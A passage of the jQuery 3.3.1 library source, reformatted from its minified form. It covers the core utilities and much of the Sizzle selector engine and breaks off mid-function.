/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */ !(function (
  e,
  t
) {
  "use strict";
  "object" == typeof module && "object" == typeof module.exports
    ? (module.exports = e.document
      ? t(e, !0)
      : function (e) {
        if (!e.document)
          throw new Error("jQuery requires a window with a document");
        return t(e);
      })
    : t(e);
})("undefined" != typeof window ? window : this, function (e, t) {
  "use strict";
  var n = [],
    i = e.document,
    o = Object.getPrototypeOf,
    r = n.slice,
    s = n.concat,
    a = n.push,
    l = n.indexOf,
    c = {},
    d = c.toString,
    u = c.hasOwnProperty,
    p = u.toString,
    f = p.call(Object),
    h = {},
    v = function (e) {
      return "function" == typeof e && "number" != typeof e.nodeType;
    },
    g = function (e) {
      return null != e && e === e.window;
    },
    y = { type: !0, src: !0, noModule: !0 };
  function m(e, t, n) {
    var o,
      r = (t = t || i).createElement("script");
    if (((r.text = e), n)) for (o in y) n[o] && (r[o] = n[o]);
    t.head.appendChild(r).parentNode.removeChild(r);
  }
  function w(e) {
    return null == e
      ? e + ""
      : "object" == typeof e || "function" == typeof e
        ? c[d.call(e)] || "object"
        : typeof e;
  }
  var b = function (e, t) {
    return new b.fn.init(e, t);
  },
    x = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;
  function k(e) {
    var t = !!e && "length" in e && e.length,
      n = w(e);
    return (
      !v(e) &&
      !g(e) &&
      ("array" === n ||
        0 === t ||
        ("number" == typeof t && t > 0 && t - 1 in e))
    );
  }
  (b.fn = b.prototype =
  {
    jquery: "3.3.1",
    constructor: b,
    length: 0,
    toArray: function () {
      return r.call(this);
    },
    get: function (e) {
      return null == e
        ? r.call(this)
        : e < 0
          ? this[e + this.length]
          : this[e];
    },
    pushStack: function (e) {
      var t = b.merge(this.constructor(), e);
      return (t.prevObject = this), t;
    },
    each: function (e) {
      return b.each(this, e);
    },
    map: function (e) {
      return this.pushStack(
        b.map(this, function (t, n) {
          return e.call(t, n, t);
        })
      );
    },
    slice: function () {
      return this.pushStack(r.apply(this, arguments));
    },
    first: function () {
      return this.eq(0);
    },
    last: function () {
      return this.eq(-1);
    },
    eq: function (e) {
      var t = this.length,
        n = +e + (e < 0 ? t : 0);
      return this.pushStack(n >= 0 && n < t ? [this[n]] : []);
    },
    end: function () {
      return this.prevObject || this.constructor();
    },
    push: a,
    sort: n.sort,
    splice: n.splice,
  }),
    (b.extend = b.fn.extend =
      function () {
        var e,
          t,
          n,
          i,
          o,
          r,
          s = arguments[0] || {},
          a = 1,
          l = arguments.length,
          c = !1;
        for (
          "boolean" == typeof s && ((c = s), (s = arguments[a] || {}), a++),
          "object" == typeof s || v(s) || (s = {}),
          a === l && ((s = this), a--);
          a < l;
          a++
        )
          if (null != (e = arguments[a]))
            for (t in e)
              (n = s[t]),
                s !== (i = e[t]) &&
                (c && i && (b.isPlainObject(i) || (o = Array.isArray(i)))
                  ? (o
                    ? ((o = !1), (r = n && Array.isArray(n) ? n : []))
                    : (r = n && b.isPlainObject(n) ? n : {}),
                    (s[t] = b.extend(c, r, i)))
                  : void 0 !== i && (s[t] = i));
        return s;
      }),
    b.extend({
      expando: "jQuery" + ("3.3.1" + Math.random()).replace(/\D/g, ""),
      isReady: !0,
      error: function (e) {
        throw new Error(e);
      },
      noop: function () { },
      isPlainObject: function (e) {
        var t, n;
        return !(
          !e ||
          "[object Object]" !== d.call(e) ||
          ((t = o(e)) &&
            ("function" !=
              typeof (n = u.call(t, "constructor") && t.constructor) ||
              p.call(n) !== f))
        );
      },
      isEmptyObject: function (e) {
        var t;
        for (t in e) return !1;
        return !0;
      },
      globalEval: function (e) {
        m(e);
      },
      each: function (e, t) {
        var n,
          i = 0;
        if (k(e))
          for (n = e.length; i < n && !1 !== t.call(e[i], i, e[i]); i++);
        else for (i in e) if (!1 === t.call(e[i], i, e[i])) break;
        return e;
      },
      trim: function (e) {
        return null == e ? "" : (e + "").replace(x, "");
      },
      makeArray: function (e, t) {
        var n = t || [];
        return (
          null != e &&
          (k(Object(e))
            ? b.merge(n, "string" == typeof e ? [e] : e)
            : a.call(n, e)),
          n
        );
      },
      inArray: function (e, t, n) {
        return null == t ? -1 : l.call(t, e, n);
      },
      merge: function (e, t) {
        for (var n = +t.length, i = 0, o = e.length; i < n; i++) e[o++] = t[i];
        return (e.length = o), e;
      },
      grep: function (e, t, n) {
        for (var i = [], o = 0, r = e.length, s = !n; o < r; o++)
          !t(e[o], o) !== s && i.push(e[o]);
        return i;
      },
      map: function (e, t, n) {
        var i,
          o,
          r = 0,
          a = [];
        if (k(e))
          for (i = e.length; r < i; r++)
            null != (o = t(e[r], r, n)) && a.push(o);
        else for (r in e) null != (o = t(e[r], r, n)) && a.push(o);
        return s.apply([], a);
      },
      guid: 1,
      support: h,
    }),
    "function" == typeof Symbol && (b.fn[Symbol.iterator] = n[Symbol.iterator]),
    b.each(
      "Boolean Number String Function Array Date RegExp Object Error Symbol".split(
        " "
      ),
      function (e, t) {
        c["[object " + t + "]"] = t.toLowerCase();
      }
    );
  var T = (function (e) {
    var t,
      n,
      i,
      o,
      r,
      s,
      a,
      l,
      c,
      d,
      u,
      p,
      f,
      h,
      v,
      g,
      y,
      m,
      w,
      b = "sizzle" + 1 * new Date(),
      x = e.document,
      k = 0,
      T = 0,
      S = se(),
      C = se(),
      $ = se(),
      A = function (e, t) {
        return e === t && (u = !0), 0;
      },
      E = {}.hasOwnProperty,
      j = [],
      D = j.pop,
      N = j.push,
      H = j.push,
      O = j.slice,
      L = function (e, t) {
        for (var n = 0, i = e.length; n < i; n++) if (e[n] === t) return n;
        return -1;
      },
      P =
        "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
      q = "[\\x20\\t\\r\\n\\f]",
      M = "(?:\\\\.|[\\w-]|[^\0-\\xa0])+",
      I =
        "\\[" +
        q +
        "*(" +
        M +
        ")(?:" +
        q +
        "*([*^$|!~]?=)" +
        q +
        "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" +
        M +
        "))|)" +
        q +
        "*\\]",
      z =
        ":(" +
        M +
        ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" +
        I +
        ")*)|.*)\\)|)",
      W = new RegExp(q + "+", "g"),
      R = new RegExp("^" + q + "+|((?:^|[^\\\\])(?:\\\\.)*)" + q + "+$", "g"),
      F = new RegExp("^" + q + "*," + q + "*"),
      B = new RegExp("^" + q + "*([>+~]|" + q + ")" + q + "*"),
      U = new RegExp("=" + q + "*([^\\]'\"]*?)" + q + "*\\]", "g"),
      X = new RegExp(z),
      _ = new RegExp("^" + M + "$"),
      Y = {
        ID: new RegExp("^#(" + M + ")"),
        CLASS: new RegExp("^\\.(" + M + ")"),
        TAG: new RegExp("^(" + M + "|[*])"),
        ATTR: new RegExp("^" + I),
        PSEUDO: new RegExp("^" + z),
        CHILD: new RegExp(
          "^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" +
          q +
          "*(even|odd|(([+-]|)(\\d*)n|)" +
          q +
          "*(?:([+-]|)" +
          q +
          "*(\\d+)|))" +
          q +
          "*\\)|)",
          "i"
        ),
        bool: new RegExp("^(?:" + P + ")$", "i"),
        needsContext: new RegExp(
          "^" +
          q +
          "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" +
          q +
          "*((?:-\\d)?\\d*)" +
          q +
          "*\\)|)(?=[^-]|$)",
          "i"
        ),
      },
      V = /^(?:input|select|textarea|button)$/i,
      G = /^h\d$/i,
      Q = /^[^{]+\{\s*\[native \w/,
      J = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
      K = /[+~]/,
      Z = new RegExp("\\\\([\\da-f]{1,6}" + q + "?|(" + q + ")|.)", "ig"),
      ee = function (e, t, n) {
        var i = "0x" + t - 65536;
        return i != i || n
          ? t
          : i < 0
            ? String.fromCharCode(i + 65536)
            : String.fromCharCode((i >> 10) | 55296, (1023 & i) | 56320);
      },
      te = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,
      ne = function (e, t) {
        return t
          ? "\0" === e
            ? "�"
            : e.slice(0, -1) +
            "\\" +
            e.charCodeAt(e.length - 1).toString(16) +
            " "
          : "\\" + e;
      },
      ie = function () {
        p();
      },
      oe = me(
        function (e) {
          return !0 === e.disabled && ("form" in e || "label" in e);
        },
        { dir: "parentNode", next: "legend" }
      );
    try {
      H.apply((j = O.call(x.childNodes)), x.childNodes),
        j[x.childNodes.length].nodeType;
    } catch (e) {
      H = {
        apply: j.length
          ? function (e, t) {
            N.apply(e, O.call(t));
          }
          : function (e, t) {
            for (var n = e.length, i = 0; (e[n++] = t[i++]););
            e.length = n - 1;
          },
      };
    }
    function re(e, t, i, o) {
      var r,
        a,
        c,
        d,
        u,
        h,
        y,
        m = t && t.ownerDocument,
        k = t ? t.nodeType : 9;
      if (
        ((i = i || []),
          "string" != typeof e || !e || (1 !== k && 9 !== k && 11 !== k))
      )
        return i;
      if (
        !o &&
        ((t ? t.ownerDocument || t : x) !== f && p(t), (t = t || f), v)
      ) {
        if (11 !== k && (u = J.exec(e)))
          if ((r = u[1])) {
            if (9 === k) {
              if (!(c = t.getElementById(r))) return i;
              if (c.id === r) return i.push(c), i;
            } else if (m && (c = m.getElementById(r)) && w(t, c) && c.id === r)
              return i.push(c), i;
          } else {
            if (u[2]) return H.apply(i, t.getElementsByTagName(e)), i;
            if (
              (r = u[3]) &&
              n.getElementsByClassName &&
              t.getElementsByClassName
            )
              return H.apply(i, t.getElementsByClassName(r)), i;
          }
        if (n.qsa && !$[e + " "] && (!g || !g.test(e))) {
          if (1 !== k) (m = t), (y = e);
          else if ("object" !== t.nodeName.toLowerCase()) {
            for (
              (d = t.getAttribute("id"))
                ? (d = d.replace(te, ne))
                : t.setAttribute("id", (d = b)),
              a = (h = s(e)).length;
              a--;

            )
              h[a] = "#" + d + " " + ye(h[a]);
            (y = h.join(",")), (m = (K.test(e) && ve(t.parentNode)) || t);
          }
          if (y)
            try {
              return H.apply(i, m.querySelectorAll(y)), i;
            } catch (e) {
            } finally {
              d === b && t.removeAttribute("id");
            }
        }
      }
      return l(e.replace(R, "$1"), t, i, o);
    }
    function se() {
      var e = [];
      return function t(n, o) {
        return (
          e.push(n + " ") > i.cacheLength && delete t[e.shift()],
          (t[n + " "] = o)
        );
      };
    }
    function ae(e) {
      return (e[b] = !0), e;
    }
    function le(e) {
      var t = f.createElement("fieldset");
      try {
        return !!e(t);
      } catch (e) {
        return !1;
      } finally {
        t.parentNode && t.parentNode.removeChild(t), (t = null);
      }
    }
    function ce(e, t) {
      for (var n = e.split("|"), o = n.length; o--;) i.attrHandle[n[o]] = t;
    }
    function de(e, t) {
      var n = t && e,
        i =
          n &&
          1 === e.nodeType &&
          1 === t.nodeType &&
          e.sourceIndex - t.sourceIndex;
      if (i) return i;
      if (n) for (; (n = n.nextSibling);) if (n === t) return -1;
      return e ? 1 : -1;
    }
    function ue(e) {
      return function (t) {
        return "input" === t.nodeName.toLowerCase() && t.type === e;
      };
    }
    function pe(e) {
      return function (t) {
        var n = t.nodeName.toLowerCase();
        return ("input" === n || "button" === n) && t.type === e;
      };
    }
    function fe(e) {
      return function (t) {
        return "form" in t
          ? t.parentNode && !1 === t.disabled
            ? "label" in t
              ? "label" in t.parentNode
                ? t.parentNode.disabled === e
                : t.disabled === e
              : t.isDisabled === e || (t.isDisabled !== !e && oe(t) === e)
            : t.disabled === e
          : "label" in t && t.disabled === e;
      };
    }
    function he(e) {
      return ae(function (t) {
        return (
          (t = +t),
          ae(function (n, i) {
            for (var o, r = e([], n.length, t), s = r.length; s--;)
              n[(o = r[s])] && (n[o] = !(i[o] = n[o]));
          })
        );
      });
    }
    function ve(e) {
      return e && void 0 !== e.getElementsByTagName && e;
    }
    for (t in ((n = re.support = {}),
      (r = re.isXML =
        function (e) {
          var t = e && (e.ownerDocument || e).documentElement;
          return !!t && "HTML" !== t.nodeName;
        }),
      (p = re.setDocument =
        function (e) {
          var t,
            o,
            s = e ? e.ownerDocument || e : x;
          return s !== f && 9 === s.nodeType && s.documentElement
            ? ((h = (f = s).documentElement),
              (v = !r(f)),
              x !== f &&
              (o = f.defaultView) &&
              o.top !== o &&
              (o.addEventListener
                ? o.addEventListener("unload", ie, !1)
                : o.attachEvent && o.attachEvent("onunload", ie)),
              (n.attributes = le(function (e) {
                return (e.className = "i"), !e.getAttribute("className");
              })),
              (n.getElementsByTagName = le(function (e) {
                return (
                  e.appendChild(f.createComment("")),
                  !e.getElementsByTagName("*").length
                );
              })),
              (n.getElementsByClassName = Q.test(f.getElementsByClassName)),
              (n.getById = le(function (e) {
                return (
                  (h.appendChild(e).id = b),
                  !f.getElementsByName || !f.getElementsByName(b).length
                );
              })),
              n.getById
                ? ((i.filter.ID = function (e) {
                  var t = e.replace(Z, ee);
                  return function (e) {
                    return e.getAttribute("id") === t;
                  };
                }),
                  (i.find.ID = function (e, t) {
                    if (void 0 !== t.getElementById && v) {
                      var n = t.getElementById(e);
                      return n ? [n] : [];
                    }
                  }))
                : ((i.filter.ID = function (e) {
                  var t = e.replace(Z, ee);
                  return function (e) {
                    var n =
                      void 0 !== e.getAttributeNode && e.getAttributeNode("id");
                    return n && n.value === t;
                  };
                }),
                  (i.find.ID = function (e, t) {
                    if (void 0 !== t.getElementById && v) {
                      var n,
                        i,
                        o,
                        r = t.getElementById(e);
                      if (r) {
                        if ((n = r.getAttributeNode("id")) && n.value === e)
                          return [r];
                        for (o = t.getElementsByName(e), i = 0; (r = o[i++]);)
                          if ((n = r.getAttributeNode("id")) && n.value === e)
                            return [r];
                      }
                      return [];
                    }
                  })),
              (i.find.TAG = n.getElementsByTagName
                ? function (e, t) {
                  return void 0 !== t.getElementsByTagName
                    ? t.getElementsByTagName(e)
                    : n.qsa
                      ? t.querySelectorAll(e)
                      : void 0;
                }
                : function (e, t) {
                  var n,
                    i = [],
                    o = 0,
                    r = t.getElementsByTagName(e);
                  if ("*" === e) {
                    for (; (n = r[o++]);) 1 === n.nodeType && i.push(n);
                    return i;
                  }
                  return r;
                }),
              (i.find.CLASS =
                n.getElementsByClassName &&
                function (e, t) {
                  if (void 0 !== t.getElementsByClassName && v)
                    return t.getElementsByClassName(e);
                }),
              (y = []),
              (g = []),
              (n.qsa = Q.test(f.querySelectorAll)) &&
              (le(function (e) {
                (h.appendChild(e).innerHTML =
                  "<a id='" +
                  b +
                  "'></a><select id='" +
                  b +
                  "-\r\\' msallowcapture=''><option selected=''></option></select>"),
                  e.querySelectorAll("[msallowcapture^='']").length &&
                  g.push("[*^$]=" + q + "*(?:''|\"\")"),
                  e.querySelectorAll("[selected]").length ||
                  g.push("\\[" + q + "*(?:value|" + P + ")"),
                  e.querySelectorAll("[id~=" + b + "-]").length || g.push("~="),
                  e.querySelectorAll(":checked").length || g.push(":checked"),
                  e.querySelectorAll("a#" + b + "+*").length ||
                  g.push(".#.+[+~]");
              }),
                le(function (e) {
                  e.innerHTML =
                    "<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";
                  var t = f.createElement("input");
                  t.setAttribute("type", "hidden"),
                    e.appendChild(t).setAttribute("name", "D"),
                    e.querySelectorAll("[name=d]").length &&
                    g.push("name" + q + "*[*^$|!~]?="),
                    2 !== e.querySelectorAll(":enabled").length &&
                    g.push(":enabled", ":disabled"),
                    (h.appendChild(e).disabled = !0),
                    2 !== e.querySelectorAll(":disabled").length &&
                    g.push(":enabled", ":disabled"),
                    e.querySelectorAll("*,:x"),
                    g.push(",.*:");
                })),
              (n.matchesSelector = Q.test(
                (m =
                  h.matches ||
                  h.webkitMatchesSelector ||
                  h.mozMatchesSelector ||
                  h.oMatchesSelector ||
                  h.msMatchesSelector)
              )) &&
              le(function (e) {
                (n.disconnectedMatch = m.call(e, "*")),
                  m.call(e, "[s!='']:x"),
                  y.push("!=", z);
              }),
              (g = g.length && new RegExp(g.join("|"))),
              (y = y.length && new RegExp(y.join("|"))),
              (t = Q.test(h.compareDocumentPosition)),
              (w =
                t || Q.test(h.contains)
                  ? function (e, t) {
                    var n = 9 === e.nodeType ? e.documentElement : e,
                      i = t && t.parentNode;
                    return (
                      e === i ||
                      !(
                        !i ||
                        1 !== i.nodeType ||
                        !(n.contains
                          ? n.contains(i)
                          : e.compareDocumentPosition &&
                          16 & e.compareDocumentPosition(i))
                      )
                    );
                  }
                  : function (e, t) {
                    if (t) for (; (t = t.parentNode);) if (t === e) return !0;
                    return !1;
                  }),
              (A = t
                ? function (e, t) {
                  if (e === t) return (u = !0), 0;
                  var i =
                    !e.compareDocumentPosition - !t.compareDocumentPosition;
                  return (
                    i ||
                    (1 &
                      (i =
                        (e.ownerDocument || e) === (t.ownerDocument || t)
                          ? e.compareDocumentPosition(t)
                          : 1) ||
                      (!n.sortDetached && t.compareDocumentPosition(e) === i)
                      ? e === f || (e.ownerDocument === x && w(x, e))
                        ? -1
                        : t === f || (t.ownerDocument === x && w(x, t))
                          ? 1
                          : d
                            ? L(d, e) - L(d, t)
                            : 0
                      : 4 & i
                        ? -1
                        : 1)
                  );
                }
                : function (e, t) {
                  if (e === t) return (u = !0), 0;
                  var n,
                    i = 0,
                    o = e.parentNode,
                    r = t.parentNode,
                    s = [e],
                    a = [t];
                  if (!o || !r)
                    return e === f
                      ? -1
                      : t === f
                        ? 1
                        : o
                          ? -1
                          : r
                            ? 1
                            : d
                              ? L(d, e) - L(d, t)
                              : 0;
                  if (o === r) return de(e, t);
                  for (n = e; (n = n.parentNode);) s.unshift(n);
                  for (n = t; (n = n.parentNode);) a.unshift(n);
                  for (; s[i] === a[i];) i++;
                  return i
                    ? de(s[i], a[i])
                    : s[i] === x
                      ? -1
                      : a[i] === x
                        ? 1
                        : 0;
                }),
              f)
            : f;
        }),
      (re.matches = function (e, t) {
        return re(e, null, null, t);
      }),
      (re.matchesSelector = function (e, t) {
        if (
          ((e.ownerDocument || e) !== f && p(e),
            (t = t.replace(U, "='$1']")),
            n.matchesSelector &&
            v &&
            !$[t + " "] &&
            (!y || !y.test(t)) &&
            (!g || !g.test(t)))
        )
          try {
            var i = m.call(e, t);
            if (
              i ||
              n.disconnectedMatch ||
              (e.document && 11 !== e.document.nodeType)
            )
              return i;
          } catch (e) { }
        return re(t, f, null, [e]).length > 0;
      }),
      (re.contains = function (e, t) {
        return (e.ownerDocument || e) !== f && p(e), w(e, t);
      }),
      (re.attr = function (e, t) {
        (e.ownerDocument || e) !== f && p(e);
        var o = i.attrHandle[t.toLowerCase()],
          r = o && E.call(i.attrHandle, t.toLowerCase()) ? o(e, t, !v) : void 0;
        return void 0 !== r
          ? r
          : n.attributes || !v
            ? e.getAttribute(t)
            : (r = e.getAttributeNode(t)) && r.specified
              ? r.value
              : null;
      }),
      (re.escape = function (e) {
        return (e + "").replace(te, ne);
      }),
      (re.error = function (e) {
        throw new Error("Syntax error, unrecognized expression: " + e);
      }),
      (re.uniqueSort = function (e) {
        var t,
          i = [],
          o = 0,
          r = 0;
        if (
          ((u = !n.detectDuplicates),
            (d = !n.sortStable && e.slice(0)),
            e.sort(A),
            u)
        ) {
          for (; (t = e[r++]);) t === e[r] && (o = i.push(r));
          for (; o--;) e.splice(i[o], 1);
        }
        return (d = null), e;
      }),
      (o = re.getText =
        function (e) {
          var t,
            n = "",
            i = 0,
            r = e.nodeType;
          if (r) {
            if (1 === r || 9 === r || 11 === r) {
              if ("string" == typeof e.textContent) return e.textContent;
              for (e = e.firstChild; e; e = e.nextSibling) n += o(e);
            } else if (3 === r || 4 === r) return e.nodeValue;
          } else for (; (t = e[i++]);) n += o(t);
          return n;
        }),
      ((i = re.selectors =
      {
        cacheLength: 50,
        createPseudo: ae,
        match: Y,
        attrHandle: {},
        find: {},
        relative: {
          ">": { dir: "parentNode", first: !0 },
          " ": { dir: "parentNode" },
          "+": { dir: "previousSibling", first: !0 },
          "~": { dir: "previousSibling" },
        },
        preFilter: {
          ATTR: function (e) {
            return (
              (e[1] = e[1].replace(Z, ee)),
              (e[3] = (e[3] || e[4] || e[5] || "").replace(Z, ee)),
              "~=" === e[2] && (e[3] = " " + e[3] + " "),
              e.slice(0, 4)
            );
          },
          CHILD: function (e) {
            return (
              (e[1] = e[1].toLowerCase()),
              "nth" === e[1].slice(0, 3)
                ? (e[3] || re.error(e[0]),
                  (e[4] = +(e[4]
                    ? e[5] + (e[6] || 1)
                    : 2 * ("even" === e[3] || "odd" === e[3]))),
                  (e[5] = +(e[7] + e[8] || "odd" === e[3])))
                : e[3] && re.error(e[0]),
              e
            );
          },
          PSEUDO: function (e) {
            var t,
              n = !e[6] && e[2];
            return Y.CHILD.test(e[0])
              ? null
              : (e[3]
                ? (e[2] = e[4] || e[5] || "")
                : n &&
                X.test(n) &&
                (t = s(n, !0)) &&
                (t = n.indexOf(")", n.length - t) - n.length) &&
                ((e[0] = e[0].slice(0, t)), (e[2] = n.slice(0, t))),
                e.slice(0, 3));
          },
        },
        filter: {
          TAG: function (e) {
            var t = e.replace(Z, ee).toLowerCase();
            return "*" === e
              ? function () {
                return !0;
              }
              : function (e) {
                return e.nodeName && e.nodeName.toLowerCase() === t;
              };
          },
          CLASS: function (e) {
            var t = S[e + " "];
            return (
              t ||
              ((t = new RegExp("(^|" + q + ")" + e + "(" + q + "|$)")) &&
                S(e, function (e) {
                  return t.test(
                    ("string" == typeof e.className && e.className) ||
                    (void 0 !== e.getAttribute && e.getAttribute("class")) ||
                    ""
                  );
                }))
            );
          },
          ATTR: function (e, t, n) {
            return function (i) {
              var o = re.attr(i, e);
              return null == o
                ? "!=" === t
                : !t ||
                ((o += ""),
                  "=" === t
                    ? o === n
                    : "!=" === t
                      ? o !== n
                      : "^=" === t
                        ? n && 0 === o.indexOf(n)
                        : "*=" === t
                          ? n && o.indexOf(n) > -1
                          : "$=" === t
                            ? n && o.slice(-n.length) === n
                            : "~=" === t
                              ? (" " + o.replace(W, " ") + " ").indexOf(n) > -1
                              : "|=" === t &&
                              (o === n || o.slice(0, n.length + 1) === n + "-"));
            };
          },
          CHILD: function (e, t, n, i, o) {
            var r = "nth" !== e.slice(0, 3),
              s = "last" !== e.slice(-4),
              a = "of-type" === t;
            return 1 === i && 0 === o
              ? function (e) {
                return !!e.parentNode;
              }
              : function (t, n, l) {
                var c,
                  d,
                  u,
                  p,
                  f,
                  h,
                  v = r !== s ? "nextSibling" : "previousSibling",
                  g = t.parentNode,
                  y = a && t.nodeName.toLowerCase(),
                  m = !l && !a,
                  w = !1;
                if (g) {
                  if (r) {
                    for (; v;) {
                      for (p = t; (p = p[v]);)
                        if (
                          a
                            ? p.nodeName.toLowerCase() === y
                            : 1 === p.nodeType
                        )
                          return !1;
                      h = v = "only" === e && !h && "nextSibling";
                    }
                    return !0;
                  }
                  if (((h = [s ? g.firstChild : g.lastChild]), s && m)) {
                    for (
                      w =
                      (f =
                        (c =
                          (d =
                            (u = (p = g)[b] || (p[b] = {}))[p.uniqueID] ||
                            (u[p.uniqueID] = {}))[e] || [])[0] === k &&
                        c[1]) && c[2],
                      p = f && g.childNodes[f];
                      (p = (++f && p && p[v]) || (w = f = 0) || h.pop());

                    )
                      if (1 === p.nodeType && ++w && p === t) {
                        d[e] = [k, f, w];
                        break;
                      }
                  } else if (
                    (m &&
                      (w = f =
                        (c =
                          (d =
                            (u = (p = t)[b] || (p[b] = {}))[p.uniqueID] ||
                            (u[p.uniqueID] = {}))[e] || [])[0] === k && c[1]),
                      !1 === w)
                  )
                    for (
                      ;
                      (p = (++f && p && p[v]) || (w = f = 0) || h.pop()) &&
                      ((a
                        ? p.nodeName.toLowerCase() !== y
                        : 1 !== p.nodeType) ||
                        !++w ||
                        (m &&
                          ((d =
                            (u = p[b] || (p[b] = {}))[p.uniqueID] ||
                            (u[p.uniqueID] = {}))[e] = [k, w]),
                          p !== t));

                    );
                  return (w -= o) === i || (w % i == 0 && w / i >= 0);
                }
              };
          },
          PSEUDO: function (e, t) {
            var n,
              o =
                i.pseudos[e] ||
                i.setFilters[e.toLowerCase()] ||
                re.error("unsupported pseudo: " + e);
            return o[b]
              ? o(t)
              : o.length > 1
                ? ((n = [e, e, "", t]),
                  i.setFilters.hasOwnProperty(e.toLowerCase())
                    ? ae(function (e, n) {
                      for (var i, r = o(e, t), s = r.length; s--;)
                        e[(i = L(e, r[s]))] = !(n[i] = r[s]);
                    })
                    : function (e) {
                      return o(e, 0, n);
                    })
                : o;
          },
        },
        pseudos: {
          not: ae(function (e) {
            var t = [],
              n = [],
              i = a(e.replace(R, "$1"));
            return i[b]
              ? ae(function (e, t, n, o) {
                for (var r, s = i(e, null, o, []), a = e.length; a--;)
                  (r = s[a]) && (e[a] = !(t[a] = r));
              })
              : function (e, o, r) {
                return (t[0] = e), i(t, null, r, n), (t[0] = null), !n.pop();
              };
          }),
          has: ae(function (e) {
            return function (t) {
              return re(e, t).length > 0;
            };
          }),
          contains: ae(function (e) {
            return (
              (e = e.replace(Z, ee)),
              function (t) {
                return (t.textContent || t.innerText || o(t)).indexOf(e) > -1;
              }
            );
          }),
          lang: ae(function (e) {
            return (
              _.test(e || "") || re.error("unsupported lang: " + e),
              (e = e.replace(Z, ee).toLowerCase()),
              function (t) {
                var n;
                do {
                  if (
                    (n = v
                      ? t.lang
                      : t.getAttribute("xml:lang") || t.getAttribute("lang"))
                  )
                    return (
                      (n = n.toLowerCase()) === e || 0 === n.indexOf(e + "-")
                    );
                } while ((t = t.parentNode) && 1 === t.nodeType);
                return !1;
              }
            );
          }),
          target: function (t) {
            var n = e.location && e.location.hash;
            return n && n.slice(1) === t.id;
          },
          root: function (e) {
            return e === h;
          },
          focus: function (e) {
            return (
              e === f.activeElement &&
              (!f.hasFocus || f.hasFocus()) &&
              !!(e.type || e.href || ~e.tabIndex)
            );
          },
          enabled: fe(!1),
          disabled: fe(!0),
          checked: function (e) {
            var t = e.nodeName.toLowerCase();
            return (
              ("input" === t && !!e.checked) || ("option" === t && !!e.selected)
            );
          },
          selected: function (e) {
            return (
              e.parentNode && e.parentNode.selectedIndex, !0 === e.selected
            );
          },
          empty: function (e) {
            for (e = e.firstChild; e; e = e.nextSibling)
              if (e.nodeType < 6) return !1;
            return !0;
          },
          parent: function (e) {
            return !i.pseudos.empty(e);
          },
          header: function (e) {
            return G.test(e.nodeName);
          },
          input: function (e) {
            return V.test(e.nodeName);
          },
          button: function (e) {
            var t = e.nodeName.toLowerCase();
            return ("input" === t && "button" === e.type) || "button" === t;
          },
          text: function (e) {
            var t;
            return (
              "input" === e.nodeName.toLowerCase() &&
              "text" === e.type &&
              (null == (t = e.getAttribute("type")) ||
                "text" === t.toLowerCase())
            );
          },
          first: he(function () {
            return [0];
          }),
          last: he(function (e, t) {
            return [t - 1];
          }),
          eq: he(function (e, t, n) {
            return [n < 0 ? n + t : n];
          }),
          even: he(function (e, t) {
            for (var n = 0; n < t; n += 2) e.push(n);
            return e;
          }),
          odd: he(function (e, t) {
            for (var n = 1; n < t; n += 2) e.push(n);
            return e;
          }),
          lt: he(function (e, t, n) {
            for (var i = n < 0 ? n + t : n; --i >= 0;) e.push(i);
            return e;
          }),
          gt: he(function (e, t, n) {
            for (var i = n < 0 ? n + t : n; ++i < t;) e.push(i);
            return e;
          }),
        },
      }).pseudos.nth = i.pseudos.eq),
      { radio: !0, checkbox: !0, file: !0, password: !0, image: !0 }))
      i.pseudos[t] = ue(t);
    for (t in { submit: !0, reset: !0 }) i.pseudos[t] = pe(t);
    function ge() { }
    function ye(e) {
      for (var t = 0, n = e.length, i = ""; t < n; t++) i += e[t].value;
      return i;
    }
    function me(e, t, n) {
      var i = t.dir,
        o = t.next,
        r = o || i,
        s = n && "parentNode" === r,
        a = T++;
      return t.first
        ? function (t, n, o) {
          for (; (t = t[i]);) if (1 === t.nodeType || s) return e(t, n, o);
          return !1;
        }
        : function (t, n, l) {
          var c,
            d,
            u,
            p = [k, a];
          if (l) {
            for (; (t = t[i]);)
              if ((1 === t.nodeType || s) && e(t, n, l)) return !0;
          } else
            for (; (t = t[i]);)
              if (1 === t.nodeType || s)
                if (
                  ((d =
                    (u = t[b] || (t[b] = {}))[t.uniqueID] ||
                    (u[t.uniqueID] = {})),
                    o && o === t.nodeName.toLowerCase())
                )
                  t = t[i] || t;
                else {
                  if ((c = d[r]) && c[0] === k && c[1] === a)
                    return (p[2] = c[2]);
                  if (((d[r] = p), (p[2] = e(t, n, l)))) return !0;
                }
          return !1;
        };
    }
    function we(e) {
      return e.length > 1
        ? function (t, n, i) {
          for (var o = e.length; o--;) if (!e[o](t, n, i)) return !1;
          return !0;
        }
        : e[0];
    }
    function be(e, t, n, i, o) {
      for (var r, s = [], a = 0, l = e.length, c = null != t; a < l; a++)
        (r = e[a]) && ((n && !n(r, i, o)) || (s.push(r), c && t.push(a)));
      return s;
    }
    function xe(e, t, n, i, o, r) {
      return (
        i && !i[b] && (i = xe(i)),
        o && !o[b] && (o = xe(o, r)),
        ae(function (r, s, a, l) {
          var c,
            d,
            u,
            p = [],
            f = [],
            h = s.length,
            v =
              r ||
              (function (e, t, n) {
                for (var i = 0, o = t.length; i < o; i++) re(e, t[i], n);
                return n;
              })(t || "*", a.nodeType ? [a] : a, []),
            g = !e || (!r && t) ? v : be(v, p, e, a, l),
            y = n ? (o || (r ? e : h || i) ? [] : s) : g;
          if ((n && n(g, y, a, l), i))
            for (c = be(y, f), i(c, [], a, l), d = c.length; d--;)
              (u = c[d]) && (y[f[d]] = !(g[f[d]] = u));
          if (r) {
            if (o || e) {
              if (o) {
                for (c = [], d = y.length; d--;)
